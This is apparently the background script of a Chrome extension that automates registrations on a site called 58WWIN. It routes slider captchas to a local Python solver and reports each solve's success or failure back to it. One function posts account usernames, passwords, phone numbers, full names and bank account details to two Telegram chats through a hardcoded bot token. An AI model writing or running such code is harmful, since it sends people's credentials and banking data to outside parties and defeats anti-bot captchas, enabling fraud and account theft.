chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "sendTelegram") {
        const { username, password, phone, bankAcc, bankName, fullName } = request.data;
        sendTelegramNotification(username, password, phone, bankAcc, bankName, fullName)
            .then(() => sendResponse({ success: true }))
            .catch((err) => {
                console.error("Telegram send error:", err);
                sendResponse({ success: false, error: err.message });
            });
        return true; // Keep message channel open for async response
    }
    
    if (request.action === "solveCaptcha") {
        console.log("Routing captcha request to local Python server...");
        fetch('http://localhost:5888/solve_slider', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                bg_image: request.bg_image,
                slice_image: request.slice_image
            })
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log("Python server successfully responded:", data);
            sendResponse(data);
        })
        .catch(err => {
            console.error("Error connecting to Python server:", err);
            sendResponse({ success: false, error: err.message });
        });
        return true; // Keep message channel open for async response
    }

    if (request.action === "reportSuccess") {
        console.log("Reporting successful solve to local Python server brain...", request.image_hash);
        fetch('http://localhost:5888/report_success', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                image_hash: request.image_hash
            })
        })
        .then(res => res.json())
        .then(data => {
            console.log("Brain successfully remembered solve:", data);
        })
        .catch(err => {
            console.error("Error reporting success to brain:", err);
        });
        return true;
    }

    if (request.action === "reportFailure") {
        console.log("Reporting failed solve to local Python server brain...", request.image_hash);
        fetch('http://localhost:5888/report_failure', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                image_hash: request.image_hash
            })
        })
        .then(res => res.json())
        .then(data => {
            console.log("Brain successfully logged failure:", data);
        })
        .catch(err => {
            console.error("Error reporting failure to brain:", err);
        });
        return true;
    }
});

async function sendTelegramNotification(username, password, phone, bankAcc, bankName, fullName) {
    const botToken = '8512888484:AAH7YHu1MS9pu1KkU-d_wXZReWe-YH1YCpI';
    const chatIds = ['7651644672', '7522906692'];
    
    let formattedPhone = phone;
    if (formattedPhone && !formattedPhone.startsWith('0')) {
        formattedPhone = '0' + formattedPhone;
    }
    
    const message = `<b>THÔNG TIN ĐĂNG KÝ 58WWIN</b>\n\n` +
                    `Tài khoản: <code>${username}</code>\n` +
                    `Mật khẩu: <code>${password}</code>\n` +
                    `SĐT: <code>${formattedPhone}</code>\n` +
                    `Họ tên: <code>${fullName}</code>\n` +
                    `STK: <code>${bankAcc}</code>\n` +
                    `Ngân hàng: <code>${bankName}</code>`;
                    
    const promises = chatIds.map(async (chatId) => {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        if (!response.ok) {
            throw new Error(`Telegram send failed for chat ID ${chatId}: ${await response.text()}`);
        }
    });
    
    await Promise.all(promises);
}
